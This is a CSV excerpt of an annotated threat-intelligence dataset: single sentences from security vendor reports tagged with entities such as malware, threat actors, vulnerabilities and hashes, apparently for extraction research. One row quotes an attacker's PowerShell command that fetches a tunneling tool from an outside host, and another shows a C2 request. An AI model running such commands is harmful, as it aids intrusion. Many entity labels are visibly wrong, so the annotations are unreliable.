,index,text,entities,relations,Comments,id,label,start_offset,end_offset
618,309,"As with any tool, remote access applications can be used for good or malicious intent.",[],[],[],,,,
619,4192,T1480 Execution Guardrails T1574.002,"[{'id': 49995, 'label': 'attack-pattern', 'start_offset': 6, 'end_offset': 36}]",[],[],49995.0,attack-pattern,6.0,36.0
620,170,Even a successful ransomware attack that is halted early by security software will achieve some level of damage – enough to make the victim consider paying the ransom to get the files back.,[],[],[],,,,
621,4023,"Depending on the target, it uses backdoors with different protocols, and it can also use the reverse proxy to bypass the monitoring of network security systems.",[],[],[],,,,
622,2496,"Palo Alto Networks Cortex XDR Prevent and Pro customers running agent version 7.4 and above with content version 450-87751 on Linux devices are protected from CVE-2022-22963 using the Java Deserialization module; customers running agent version 7.7 and content 480 and above are protected from CVE-2022-22963 and CVE-2022-22965 for both Windows and Linux using the Java Deserialization module; other OSes and exploits receive protections from post-exploitation activities using Behavioral Threat Protection, Password Theft Prevention, Anti Ransomware and other Anti Exploitation modules.","[{'id': 47587, 'label': 'vulnerability', 'start_offset': 159, 'end_offset': 173}, {'id': 47585, 'label': 'SOFTWARE', 'start_offset': 0, 'end_offset': 45}, {'id': 47588, 'label': 'SOFTWARE', 'start_offset': 184, 'end_offset': 211}, {'id': 47590, 'label': 'vulnerability', 'start_offset': 313, 'end_offset': 327}, {'id': 47591, 'label': 'SOFTWARE', 'start_offset': 337, 'end_offset': 344}, {'id': 47593, 'label': 'SOFTWARE', 'start_offset': 365, 'end_offset': 392}, {'id': 47586, 'label': 'SOFTWARE', 'start_offset': 126, 'end_offset': 131}, {'id': 47589, 'label': 'vulnerability', 'start_offset': 294, 'end_offset': 308}, {'id': 47592, 'label': 'SOFTWARE', 'start_offset': 349, 'end_offset': 354}]","[{'id': 342, 'from_id': 47587, 'to_id': 47588, 'type': 'related-to'}]",[],47587.0,vulnerability,159.0,173.0
623,1955,"It can protect users against malware, zero-day and known exploits, privacy leaks, and application vulnerability.","[{'id': 47077, 'label': 'attack-pattern', 'start_offset': 38, 'end_offset': 46}, {'id': 47079, 'label': 'attack-pattern', 'start_offset': 86, 'end_offset': 111}, {'id': 47080, 'label': 'attack-pattern', 'start_offset': 29, 'end_offset': 36}, {'id': 47081, 'label': 'attack-pattern', 'start_offset': 67, 'end_offset': 80}, {'id': 47078, 'label': 'attack-pattern', 'start_offset': 51, 'end_offset': 65}]",[],[],47077.0,attack-pattern,38.0,46.0
624,11011,We encourage anyone who discovers a Chrome vulnerability to report that activity through the Chrome Vulnerabilities Rewards Program submission process.,[],[],[],,,,
625,2990,d. Deleting or “wiping” data if too many bad passcodes are tried or if you active it remotely.,[],[],[],,,,
626,2894, s[_local28][(((_local41 - _local12) / 4) + 12)],[],[],[],,,,
627,4817,Follina is a remote code execution (RCE) vulnerability in the Microsoft Windows Support Diagnostic Tool (MSDT).,"[{'id': 50748, 'label': 'SOFTWARE', 'start_offset': 62, 'end_offset': 110}, {'id': 50746, 'label': 'vulnerability', 'start_offset': 13, 'end_offset': 54}, {'id': 50747, 'label': 'vulnerability', 'start_offset': 0, 'end_offset': 7}]","[{'id': 1004, 'from_id': 50746, 'to_id': 50747, 'type': 'duplicate-of'}, {'id': 1005, 'from_id': 50748, 'to_id': 50747, 'type': 'has'}]",[],50748.0,SOFTWARE,62.0,110.0
628,760,The main idea of this protection mechanism is to delay the freeing action so that the intruder is unable to determine when they can occupy the freed object using controlled data.,[],[],[],,,,
629,3761, We also observed some instances of injected payloads that were either trying to read authorized keys on vulnerable machines or were writing into the authorized_keys file to add to the machine’s list of accepted keys.,[],[],[],,,,
630,6788,"This particular behavior is a slight departure from previously reported attacks by Gamaredon, which did not use this technique.",[],[],[],,,,
631,4436,pipeCommunication.Close(); },[],[],[],,,,
632,2131,"As noted above, the PoC works only against systems that are vulnerable and meet both conditions for exploitability.",[],[],[],,,,
633,884,The ‘P0’ is statically set by the malware in the above request.,[],[],[],,,,
634,2498,"Furthermore, customers can create a BIOC from an XQL query looking for the dropped webshell IoCs to detect exploitation attempts in their environments.","[{'id': 47600, 'label': 'attack-pattern', 'start_offset': 83, 'end_offset': 91}]",[],[],47600.0,attack-pattern,83.0,91.0
635,1586, Conclusion  Bad Rabbit is not as widespread of an attack as Petya/NotPetya but is causing severe disruptions where it is occurring.,"[{'id': 4729, 'label': 'malware', 'start_offset': 13, 'end_offset': 23}, {'id': 4730, 'label': 'malware', 'start_offset': 61, 'end_offset': 66}, {'id': 4731, 'label': 'malware', 'start_offset': 67, 'end_offset': 75}]",[],[],4729.0,malware,13.0,23.0
636,5080,"In line with our current disclosure policy, we are providing these details 30 days after the patch release.",[],[],[],,,,
637,756,They encapsulate this method and apply it to almost every object in mshtml.dll.,"[{'id': 44855, 'label': 'FILEPATH', 'start_offset': 68, 'end_offset': 78}]",[],[],44855.0,FILEPATH,68.0,78.0
638,13678,A phishing site imitates Office 365 login     ,"[{'id': 42549, 'label': 'attack-pattern', 'start_offset': 2, 'end_offset': 10}]",[],[],42549.0,attack-pattern,2.0,10.0
639,10324,The MuddyWater campaign was first sighted in 2017 when it targeted the Saudi government using an attack involving PowerShell scripts deployed via Microsoft Office Word macro.,"[{'id': 31465, 'label': 'location', 'start_offset': 15, 'end_offset': 23}, {'id': 31468, 'label': 'attack-pattern', 'start_offset': 114, 'end_offset': 124}, {'id': 31470, 'label': 'tools', 'start_offset': 156, 'end_offset': 162}]",[],[],31465.0,location,15.0,23.0
640,7327,    Recommendations,[],[],[],,,,
641,3303,It will read the “Local State” file to grab the AES secret key of Google Chrome-based browsers.,"[{'id': 48387, 'label': 'SOFTWARE', 'start_offset': 66, 'end_offset': 79}]",[],[],48387.0,SOFTWARE,66.0,79.0
642,4535,The U.S. could also set an example to other governments by reviewing and disclosing its own historical use of these tools.,"[{'id': 50329, 'label': 'identity', 'start_offset': 4, 'end_offset': 8}]",[],[],50329.0,identity,4.0,8.0
643,5979,"The group's tactics, techniques and procedures (TTPs) for these campaigns have shifted slightly from including phishing links directly in the email, to also linking to PDFs and/or DOCs hosted on Google Drive and Microsoft One Drive.","[{'id': 18395, 'label': 'location', 'start_offset': 32, 'end_offset': 35}, {'id': 18396, 'label': 'attack-pattern', 'start_offset': 111, 'end_offset': 119}, {'id': 18398, 'label': 'location', 'start_offset': 208, 'end_offset': 211}]",[],[],18395.0,location,32.0,35.0
644,4395,GET http://{C2}/Index.php?Ck=OK HTTP/1.1,"[{'id': 50205, 'label': 'URL', 'start_offset': 4, 'end_offset': 31}]",[],[],50205.0,URL,4.0,31.0
645,5227,"But there are also other threats stirring up as of late: attacks that spy on and steal data from specific targets, crossing over between desktops and mobile devices.",[],[],[],,,,
646,4841,"The hack-for-hire landscape is fluid, both in how the attackers organize themselves and in the wide range of targets they pursue in a single campaign at the behest of disparate clients.",[],[],[],,,,
647,2528,"They want to establish stellar reputations for “customer service” and for delivering on what they promise – that if you pay a ransom, your files will be decrypted (and they will not appear on a leak website).",[],[],[],,,,
648,8441,"During the development stage, Android-created and open source components are subject to vigorous security reviews","[{'id': 26012, 'label': 'location', 'start_offset': 46, 'end_offset': 49}, {'id': 26013, 'label': 'attack-pattern', 'start_offset': 55, 'end_offset': 61}, {'id': 26014, 'label': 'location', 'start_offset': 73, 'end_offset': 76}, {'id': 26015, 'label': 'location', 'start_offset': 97, 'end_offset': 105}]",[],[],26012.0,location,46.0,49.0
649,1541,"Given the significant activity attributed to Sofacy, and the new evidence directly targeting the diplomatic community, Palo Alto Networks wants to ensure that foreign affairs agencies around the world understand how the attacks are carried out, and what agencies and personnel can do to protect themselves.","[{'id': 46809, 'label': 'threat-actor', 'start_offset': 45, 'end_offset': 51}, {'id': 46810, 'label': 'identity', 'start_offset': 119, 'end_offset': 137}]",[],[],46809.0,threat-actor,45.0,51.0
650,2921, Unit 42 has just released new research showing that attackers are indeed continuing to adapt existing techniques to generate cryptocurrency.,"[{'id': 48091, 'label': 'identity', 'start_offset': 1, 'end_offset': 8}]",[],[],48091.0,identity,1.0,8.0
651,3880,Trend Micro OfficeScan™ with XGen™ endpoint security,"[{'id': 49737, 'label': 'SOFTWARE', 'start_offset': 0, 'end_offset': 34}]",[],[],49737.0,SOFTWARE,0.0,34.0
652,7155,New HyperBro and Pandora samples found December 2020:,"[{'id': 22376, 'label': 'malware', 'start_offset': 4, 'end_offset': 12}, {'id': 22377, 'label': 'location', 'start_offset': 13, 'end_offset': 16}]",[],[],22376.0,malware,4.0,12.0
653,13385,"To protect our users, Google’s Threat Analysis Group (TAG) routinely hunts for 0-day vulnerabilities exploited in-the-wild.",[],[],[],,,,
654,6279, Organizations should block access to the following domains to prevent Filmkan from receiving updates from the attacker.,[],[],[],,,,
655,5405,"Once an IoT device is infected with malware, an attacker can have unrestricted internet access for downloading and deploying more stages of malware for reconnaissance, espionage, proxying, or anything else that the attacker wants to do.",[],[],[],,,,
656,4335,"It should be noted that most of the compilation timestamps of these DLL files have been modified by the attacker to a year in the far future (2060, 2099 …), and the server IP addresses are often hidden behind CloudFlare.","[{'id': 50130, 'label': 'SOFTWARE', 'start_offset': 209, 'end_offset': 219}]",[],[],50130.0,SOFTWARE,209.0,219.0
657,2575,"Hear from innovators and experts, gain real-world skills through hands-on sessions and interactive workshops, and find out how breach prevention is changing the security industry.",[],[],[],,,,
658,11499,"We assess this actor is a former initial ransomware access broker who previously worked with the Conti ransomware group distributing the IcedID banking trojan based on overlaps in infrastructure, tools used in previous campaigns, and a unique cryptor.","[{'id': 35171, 'label': 'threat-actor', 'start_offset': 97, 'end_offset': 102}, {'id': 35172, 'label': 'malware', 'start_offset': 137, 'end_offset': 143}, {'id': 35173, 'label': 'location', 'start_offset': 230, 'end_offset': 233}]",[],[],35171.0,threat-actor,97.0,102.0
659,10532,We received leads from Graphika that supported us in this investigation.,[],[],[],,,,
660,2300,"As is our policy, we quickly reported this 0-day to the vendor (Apple) and a patch was released to protect users from these attacks.","[{'id': 47367, 'label': 'identity', 'start_offset': 64, 'end_offset': 69}]",[],[],47367.0,identity,64.0,69.0
661,14019,"When the version resource is compiled into the binary, a language ID is generated and created not in the resource payload but in the internal structure of the resource information that is not visible with Windows Explorer.","[{'id': 47188, 'label': 'SOFTWARE', 'start_offset': 205, 'end_offset': 221}]",[],[],47188.0,SOFTWARE,205.0,221.0
662,1432,"For example, BlueBox recently revealed the Fake ID vulnerability, which exploits an app’s certificate verification process within the Android OS.","[{'id': 46764, 'label': 'identity', 'start_offset': 13, 'end_offset': 20}, {'id': 46765, 'label': 'SOFTWARE', 'start_offset': 134, 'end_offset': 144}]",[],[],46764.0,identity,13.0,20.0
663,4022,The group knows how to bypass security settings and keep its operation unobstructive.,[],[],[],,,,
664,5972,Malware samples:,[],[],[],,,,
665,2331,There was code to download a file from a C2 but we did not come across any URL strings in the Mach-O so we checked the javascript and saw there were two arguments passed when the binary is run–the url for the payload and its size,[],[],[],,,,
666,11883,During our investigation we discovered several documents uploaded to VirusTotal.,[],[],[],,,,
667,91," Please mark, I'm not a robot!  By submitting this form, you agree to our Terms of Use and acknowledge our Privacy Statement.",[],[],[],,,,
668,840,"When talking about operating systems with security permissions and controls like Windows or UNIX/Linux, the kernel operates with the highest level of control.","[{'id': 46392, 'label': 'SOFTWARE', 'start_offset': 97, 'end_offset': 102}, {'id': 46391, 'label': 'SOFTWARE', 'start_offset': 92, 'end_offset': 96}, {'id': 44885, 'label': 'SOFTWARE', 'start_offset': 81, 'end_offset': 88}]",[],[],46392.0,SOFTWARE,97.0,102.0
669,10909,"For example, one of the samples that we had examined earlier, gathers files with the following extensions:  .7z .asc .dgs .doc .docx .gpg .pdf .pgp .ppt .pptx .rar .rjv .rms .rtf .sft .tc .txt .xls .xlsx  As we previously mentioned, there are no public reports of the StrongPity threat actor using malicious Android applications in the attack.","[{'id': 33202, 'label': 'location', 'start_offset': 13, 'end_offset': 16}, {'id': 33203, 'label': 'location', 'start_offset': 239, 'end_offset': 242}, {'id': 33204, 'label': 'location', 'start_offset': 246, 'end_offset': 252}, {'id': 33205, 'label': 'malware', 'start_offset': 268, 'end_offset': 278}]",[],[],33202.0,location,13.0,16.0
670,3113," For end-users and those managing networks, the greatest risk these vulnerabilities pose is exploitation by malware seeking to gather information like usernames and passwords from systems.  What makes these vulnerabilities most notable from a risk assessment point of view is breadth of exposure.",[],[],[],,,,
671,9370, Figure 6. Fake copyright info,[],[],[],,,,
672,2926,"While XMRig isn’t itself specifically malware, it’s being delivered using malware-delivery techniques without the user’s knowledge and consent just like malware.","[{'id': 48097, 'label': 'tools', 'start_offset': 6, 'end_offset': 11}]",[],[],48097.0,tools,6.0,11.0
673,13580,The script replaces the page content with an authorization error message and redirects users to the phishing website     Webshell/PHP backdoor injection,"[{'id': 51661, 'label': 'malware', 'start_offset': 4, 'end_offset': 10}]",[],[],51661.0,malware,4.0,10.0
674,2228,This process name is associated with the South Korean-based AhnLab security software provider.,"[{'id': 47326, 'label': 'location', 'start_offset': 41, 'end_offset': 53}, {'id': 47327, 'label': 'identity', 'start_offset': 60, 'end_offset': 66}]",[],[],47326.0,location,41.0,53.0
675,8817,"As the course of the COVID-19 pandemic evolves, we’ve seen threat actors evolve their tactics as well.",[],[],[],,,,
676,822,Researcher Tal Be’ery released a blog titled “Win 10 Crypto Vulnerability: Cheating in Elliptic Curve Billiard 2” that does a fantastic job at explaining this bug.,"[{'id': 2688, 'label': 'location', 'start_offset': 136, 'end_offset': 139}, {'id': 46370, 'label': 'SOFTWARE', 'start_offset': 46, 'end_offset': 52}, {'id': 44874, 'label': 'identity', 'start_offset': 11, 'end_offset': 21}]",[],[],2688.0,location,136.0,139.0
677,9112,"When 2014 rolled in, Lurk started exhibiting some patterns similar with the Angler exploit kit.","[{'id': 28128, 'label': 'threat-actor', 'start_offset': 21, 'end_offset': 25}]",[],[],28128.0,threat-actor,21.0,25.0
678,1638,While the name “Oscar Sanchez” may be a pseudonym,"[{'id': 45082, 'label': 'identity', 'start_offset': 16, 'end_offset': 29}]",[],[],45082.0,identity,16.0,29.0
679,746," To deal with the increasing number of use-after-free bugs and associated exploits, Microsoft introduced a series of new control mechanisms in the most recent Internet Explorer patches.","[{'id': 46340, 'label': 'identity', 'start_offset': 84, 'end_offset': 93}, {'id': 46341, 'label': 'SOFTWARE', 'start_offset': 159, 'end_offset': 176}]",[],[],46340.0,identity,84.0,93.0
680,12847,Security teams can leverage the MITRE ATT&CK framework to tell a story that helps simplify security communication across their organization.,"[{'id': 40038, 'label': 'location', 'start_offset': 0, 'end_offset': 8}, {'id': 40039, 'label': 'location', 'start_offset': 15, 'end_offset': 18}, {'id': 40040, 'label': 'malware', 'start_offset': 19, 'end_offset': 27}, {'id': 40042, 'label': 'location', 'start_offset': 58, 'end_offset': 62}, {'id': 40043, 'label': 'location', 'start_offset': 65, 'end_offset': 70}, {'id': 40044, 'label': 'location', 'start_offset': 91, 'end_offset': 99}]",[],[],40038.0,location,0.0,8.0
681,313," Examples include Remote Desktop Protocol (RDP), Virtual Network Connection (VNC), TeamViewer, and even Secure Shell (SSH), to name a few.","[{'id': 1072, 'label': 'attack-pattern', 'start_offset': 18, 'end_offset': 41}, {'id': 1075, 'label': 'tools', 'start_offset': 83, 'end_offset': 93}, {'id': 1073, 'label': 'tools', 'start_offset': 43, 'end_offset': 46}, {'id': 46010, 'label': 'tools', 'start_offset': 104, 'end_offset': 122}, {'id': 46011, 'label': 'tools', 'start_offset': 49, 'end_offset': 81}]",[],[],1072.0,attack-pattern,18.0,41.0
682,10678,"As Trend Micro reported, these two are path traversal vulnerabilities that allow attackers to map URLs to files/directories outside of the webroot.","[{'id': 32598, 'label': 'location', 'start_offset': 35, 'end_offset': 38}, {'id': 32599, 'label': 'attack-pattern', 'start_offset': 39, 'end_offset': 53}]",[],[],32598.0,location,35.0,38.0
683,6524,Tool for accessing browser DBs 1.exe 78b1ab1b8196dc236fa6ad4014dd6add142b3cab583e116da7e8886bc47a7347 HackTool.Win64.LIGOLO.A LIGOLO tunneling tool  ,"[{'id': 20230, 'label': 'location', 'start_offset': 0, 'end_offset': 4}, {'id': 20231, 'label': 'SHA2', 'start_offset': 37, 'end_offset': 101}, {'id': 20232, 'label': 'location', 'start_offset': 143, 'end_offset': 147}]",[],[],20230.0,location,0.0,4.0
684,560,"The 25.1 BTC amount was worth $1.18 million at that time, and now is about $876,000.",[],[],[],,,,
685,14187,"What we can expect If this kind of escalation were to take place, it may begin through deployment of known destructive malware like IsaacWiper, HermeticWiper and WhisperKill onto already compromised targets or systems known to be vulnerable.","[{'id': 48224, 'label': 'malware', 'start_offset': 132, 'end_offset': 142}, {'id': 48226, 'label': 'malware', 'start_offset': 162, 'end_offset': 174}, {'id': 48225, 'label': 'malware', 'start_offset': 144, 'end_offset': 158}]",[],[],48224.0,malware,132.0,142.0
686,14151,Many organizations have been adopting EDR (Endpoint Detection & Response) as a way to obtain more data about attacks on the endpoint.,[],[],[],,,,
687,788,"For example, you can call MemoryProtection::CMemoryProtector::UnprotectProcess before you perform any fuzzing tasks.","[{'id': 46350, 'label': 'attack-pattern', 'start_offset': 102, 'end_offset': 109}]",[],[],46350.0,attack-pattern,102.0,109.0
688,6972,"In 2020, Earth Karkaddan used an updated version of the AhMyth Android RAT to target Indian military and government personnel via a disguised porn app and a fraudulent national Covid-19 tracking app.","[{'id': 21834, 'label': 'malware', 'start_offset': 63, 'end_offset': 74}, {'id': 21835, 'label': 'location', 'start_offset': 78, 'end_offset': 84}, {'id': 21837, 'label': 'location', 'start_offset': 101, 'end_offset': 104}, {'id': 21838, 'label': 'location', 'start_offset': 151, 'end_offset': 154}, {'id': 21839, 'label': 'location', 'start_offset': 168, 'end_offset': 176}]",[],[],21834.0,malware,63.0,74.0
689,669,"If the user has not enabled macros, a popup window will appear asking the user to click to do so.",[],[],[],,,,
690,7844," While there is still debate about how to store passwords in internal storage, if Android internal storage isn’t accessible to anything but the application that owns it, it remains secure.",[],[],[],,,,
691,4431,"Process process = new Process(); process.StartInfo.Arguments = string.Format(""PIPE Google \""{0}\"""", text); process.StartInfo.FileName = Process.GetCurrentProcess().MainModule.FileName; process.Start();",[],[],[],,,,
692,2011,The ransom note also instructs victims to download Tox and provides a Tox Chat ID to reach the threat actor.,[],[],[],,,,
693,14219,Figure 1: Extra section .idata added to the original loadperf.dll  Figure 2: Extra imported function gzwrite64,"[{'id': 48248, 'label': 'SOFTWARE', 'start_offset': 101, 'end_offset': 110}]",[],[],48248.0,SOFTWARE,101.0,110.0
694,13948,"SunCrypt, RagnarLocker, and Avaddon were among the first groups documented doing this.","[{'id': 48764, 'label': 'threat-actor', 'start_offset': 10, 'end_offset': 22}, {'id': 48765, 'label': 'threat-actor', 'start_offset': 0, 'end_offset': 8}, {'id': 48766, 'label': 'threat-actor', 'start_offset': 28, 'end_offset': 36}]",[],[],48764.0,threat-actor,10.0,22.0
695,401," As further information emerges or additional detections and protections are put into place, Palo Alto Networks will update this publication accordingly.","[{'id': 46102, 'label': 'identity', 'start_offset': 93, 'end_offset': 111}]",[],[],46102.0,identity,93.0,111.0
696,4994,Related IOCs,[],[],[],,,,
697,10316,IMAP RAT  Trojan.MSIL.OCEANMAP.A  Troj.Win32.TRX.XXPE50FFF039  31577308ac62fd29d3159118d1f552b28a56a9c039fef1d3337c9700a3773cbf,"[{'id': 31459, 'label': 'SHA1', 'start_offset': 63, 'end_offset': 127}]",[],[],31459.0,SHA1,63.0,127.0
698,4060,ChiserClient is installed as a system service to allow the threat actors access to higher privileges and keep persistence on the compromised host.,"[{'id': 49900, 'label': 'malware', 'start_offset': 0, 'end_offset': 12}]",[],[],49900.0,malware,0.0,12.0
699,1180,We’ll leave that determination to the reader.,[],[],[],,,,
700,4372,"      Tags  APT & Targeted Attacks | Cyber Crime | Research | Articles, News, Reports",[],[],[],,,,
701,8322,Accept-Encoding: gzip Connection: Keep-Alive,[],[],[],,,,
702,2778, The focus of these attacks is to use the victim’s web browser to access the computational resources of their system.,[],[],[],,,,
703,13056,"In this blog, Trend Micro researchers walk through a recent investigation that involved trojanized open-source software, which is tricky to spot because it takes on the façade of legitimate, non-malicious software, making it especially stealthy and useful for targeted attacks.",[],[],[],,,,
704,4245,We initially spotted some visual similarities between the malware used.,[],[],[],,,,
705,3766," Attackers can, therefore, leverage CVE-2022-22954 to remotely execute commands to overwrite specific paths.","[{'id': 49598, 'label': 'attack-pattern', 'start_offset': 83, 'end_offset': 107}, {'id': 49596, 'label': 'vulnerability', 'start_offset': 36, 'end_offset': 50}, {'id': 49597, 'label': 'attack-pattern', 'start_offset': 54, 'end_offset': 79}]","[{'id': 842, 'from_id': 49596, 'to_id': 49597, 'type': 'uses'}, {'id': 843, 'from_id': 49596, 'to_id': 49598, 'type': 'uses'}]",[],49598.0,attack-pattern,83.0,107.0
706,3613,07be156caac1157707ffe38266dc60abadc488226b4f41d67f23eac98dd917b0,"[{'id': 10903, 'label': 'SHA2', 'start_offset': 0, 'end_offset': 64}]",[],[],10903.0,SHA2,0.0,64.0
707,456, What is it?,[],[],[],,,,
708,13093,"As connectivity is introduced to industrial computing devices, the challenge is managing the threat from remote attackers.",[],[],[],,,,
709,1017,Another seller offered to provide real identity information for a stolen account so the buyer could change the corresponding password and security questions.,[],[],[],,,,
710,56,"In the last two years, but particularly in the last six months, the price of bitcoin and other cryptocurrencies experienced a massive price surge with respect to the U.S. dollar and other fiat currencies.",[],[],[],,,,
711,8307,HYPERSCRAPE demonstrates Charming Kitten’s commitment to developing and maintaining purpose-built capabilities.,"[{'id': 25616, 'label': 'threat-actor', 'start_offset': 25, 'end_offset': 40}, {'id': 25617, 'label': 'location', 'start_offset': 68, 'end_offset': 71}]",[],[],25616.0,threat-actor,25.0,40.0
712,3275,BIOPASS RAT commands   OpenEverything  The malware downloads “Everything” files if the “Everything” binary is not found in the “%TEMP%” folder.,"[{'id': 48373, 'label': 'FILEPATH', 'start_offset': 128, 'end_offset': 134}, {'id': 9976, 'label': 'malware', 'start_offset': 0, 'end_offset': 11}]",[],[],48373.0,FILEPATH,128.0,134.0
713,12814,"Additionally, the IP 211[.]72 [.]242[.]120 is one of the hosts for the domain microsoftmse[.]com, which has been used by several KIVARS variants.","[{'id': 39901, 'label': 'location', 'start_offset': 46, 'end_offset': 49}, {'id': 39902, 'label': 'malware', 'start_offset': 129, 'end_offset': 135}]",[],[],39901.0,location,46.0,49.0
714,6371," Once the SSL handshake to IP 174.129.157[.]251 is complete, the following data is sent via HTTP POST to the Brute Ratel C4 listener port.","[{'id': 19759, 'label': 'location', 'start_offset': 10, 'end_offset': 13}, {'id': 19760, 'label': 'IPV4', 'start_offset': 30, 'end_offset': 47}, {'id': 19761, 'label': 'location', 'start_offset': 97, 'end_offset': 101}]",[],[],19759.0,location,10.0,13.0
715,2945," Looking at this latest operation on the continuum of evolving cryptocurrency-focused threats, it’s clear that this is an early-stage threat given its lack of sophistication and reuse of established techniques and tactics.",[],[],[],,,,
716,1382,AdvancedRun.exe is used to execute PowerShell.exe to delete and stop Windows Defender.,"[{'id': 46721, 'label': 'FILEPATH', 'start_offset': 0, 'end_offset': 15}, {'id': 46722, 'label': 'FILEPATH', 'start_offset': 35, 'end_offset': 49}, {'id': 46723, 'label': 'SOFTWARE', 'start_offset': 69, 'end_offset': 85}]",[],[],46721.0,FILEPATH,0.0,15.0
717,4659,"A new folder named ""Download"" is created adjacent to the main binary.",[],[],[],,,,
718,1380,A Visual Basic Script (VBS) is created in C:\Users\[USERNAME]\AppData\Local\Temp named: Nmddfrqqrbyjeygggda.vbs  4. Process wscript.exe is used to execute the VBS script in step 3.,"[{'id': 44985, 'label': 'FILEPATH', 'start_offset': 88, 'end_offset': 111}, {'id': 44986, 'label': 'FILEPATH', 'start_offset': 124, 'end_offset': 135}, {'id': 44984, 'label': 'FILEPATH', 'start_offset': 42, 'end_offset': 80}]",[],[],44985.0,FILEPATH,88.0,111.0
719,13986,"While the endpoint is still critical, there are vast numbers of malicious artifacts that are siloed or missed at the network, cloud, and gateway.",[],[],[],,,,
720,8635,The links led to attacker-controlled domains that mimicked legitimate websites related to the targeted users.,[],[],[],,,,
721,4151,"This is used to download reverse proxy Chisel via PowerShell: c:\windows\system32\windowspowershell\v1.0\powershell.exe -command ""$(new-object System.Net.WebClient).DownloadFile('https[:]//webadmin[.]mirrorstorage[.]org/ch.exe', 'ch.exe')""","[{'id': 12475, 'label': 'malware', 'start_offset': 39, 'end_offset': 45}, {'id': 12476, 'label': 'tools', 'start_offset': 50, 'end_offset': 60}, {'id': 49959, 'label': 'FILEPATH', 'start_offset': 62, 'end_offset': 119}, {'id': 49960, 'label': 'URL', 'start_offset': 179, 'end_offset': 226}, {'id': 49961, 'label': 'FILEPATH', 'start_offset': 230, 'end_offset': 236}]",[],[],12475.0,malware,39.0,45.0
722,325," F-Secure was the first to spot this new version on October 1, but since then the attacks have ramped up and new variants of the malware are emerging daily.","[{'id': 46017, 'label': 'TIME', 'start_offset': 52, 'end_offset': 61}, {'id': 46016, 'label': 'identity', 'start_offset': 1, 'end_offset': 9}]",[],[],46017.0,TIME,52.0,61.0
723,3453,"By submitting this form, you agree to our Terms of Use and acknowledge our Privacy Statement.  ",[],[],[],,,,
724,62,"In contrast to bitcoin, Monero was designed to enable private transactions using a closed ledger, and its mining algorithm is still mined effectively by both PC CPUs and GPUs.","[{'id': 45820, 'label': 'SOFTWARE', 'start_offset': 24, 'end_offset': 30}]",[],[],45820.0,SOFTWARE,24.0,30.0
725,12030,"Some commodity malware used included RedLine, Vidar, Predator The Thief, Nexus stealer, Azorult, Raccoon, Grand Stealer, Vikro Stealer, Masad (Google’s naming), and Kantal (Google’s naming) which shares code similarity with Vidar.","[{'id': 37224, 'label': 'malware', 'start_offset': 79, 'end_offset': 86}, {'id': 37231, 'label': 'location', 'start_offset': 161, 'end_offset': 164}]",[],[],37224.0,malware,79.0,86.0
726,4852,"TAG has linked former employees of both Appin and Belltrox to Rebsec, a new firm that openly advertises corporate espionage as an offering on its company website.","[{'id': 50828, 'label': 'identity', 'start_offset': 0, 'end_offset': 3}, {'id': 50829, 'label': 'identity', 'start_offset': 40, 'end_offset': 45}, {'id': 50831, 'label': 'identity', 'start_offset': 62, 'end_offset': 68}, {'id': 50830, 'label': 'identity', 'start_offset': 50, 'end_offset': 58}]",[],[],50828.0,identity,0.0,3.0
727,13518,Encrypt the drives of all computers and other machines that are used to store sensitive information.,[],[],[],,,,
728,4850,"One cluster of this activity frequently targets government, healthcare, and telecom sectors in Saudi Arabia, the United Arab Emirates, and Bahrain with credential phishing campaigns.","[{'id': 50820, 'label': 'location', 'start_offset': 95, 'end_offset': 107}, {'id': 50821, 'label': 'location', 'start_offset': 113, 'end_offset': 133}, {'id': 50822, 'label': 'location', 'start_offset': 139, 'end_offset': 146}, {'id': 50823, 'label': 'campaign', 'start_offset': 152, 'end_offset': 181}]","[{'id': 1025, 'from_id': 50823, 'to_id': 50822, 'type': 'targets'}, {'id': 1026, 'from_id': 50823, 'to_id': 50820, 'type': 'targets'}, {'id': 1027, 'from_id': 50823, 'to_id': 50821, 'type': 'targets'}]",[],50820.0,location,95.0,107.0
729,5143,"You would never think of going, ""Okay.",[],[],[],,,,
730,10018,— TSPY_KORPLUG.AN 52374f68d1e43f1ca6cd04e5816999ba45c4e42eb0641874be25808c9fe15005 (rcview.log),"[{'id': 30592, 'label': 'SHA2', 'start_offset': 18, 'end_offset': 82}]",[],[],30592.0,SHA2,18.0,82.0
731,10094,It can also execute web shell commands via a specific HTTP request format.,"[{'id': 30785, 'label': 'location', 'start_offset': 3, 'end_offset': 6}, {'id': 30786, 'label': 'attack-pattern', 'start_offset': 20, 'end_offset': 29}]",[],[],30785.0,location,3.0,6.0
